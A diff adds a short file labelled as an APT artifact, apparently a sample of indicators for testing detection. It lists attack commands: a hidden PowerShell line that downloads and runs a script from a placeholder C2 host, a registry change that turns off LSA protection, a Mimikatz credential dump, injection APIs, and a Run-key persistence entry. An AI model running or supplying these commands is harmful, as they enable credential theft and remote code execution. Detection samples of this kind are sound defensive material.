@@ -1,0 +1,25 @@
+# Advanced Persistent Threat (APT) Artifact
+# Credential Theft and Lateral Movement Toolset
+
+Tool References:
+mimikatz sekurlsa::logonpasswords
+cobalt strike beacon listener
+metasploit windows/meterpreter/reverse_tcp
+
+Execution Commands:
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://c2.apt-domain.biz/payload.ps1'))"
+cmd.exe /c reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "RunAsPPL" /t REG_DWORD /d 0 /f
+cmd.exe /c powershell.exe -Command "Invoke-Mimikatz -DumpCreds"
+cmd.exe /c net view /domain
+
+Injected APIs & Shellcode:
+CreateRemoteThread
+VirtualAllocEx
+WriteProcessMemory
+OpenProcess
+URLDownloadToFile http://c2.apt-domain.biz/module.dll
+
+C2 Network Beacons:
+https://c2.apt-domain.biz/submit.php
+203.0.113.200
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run\MimikatzSvc
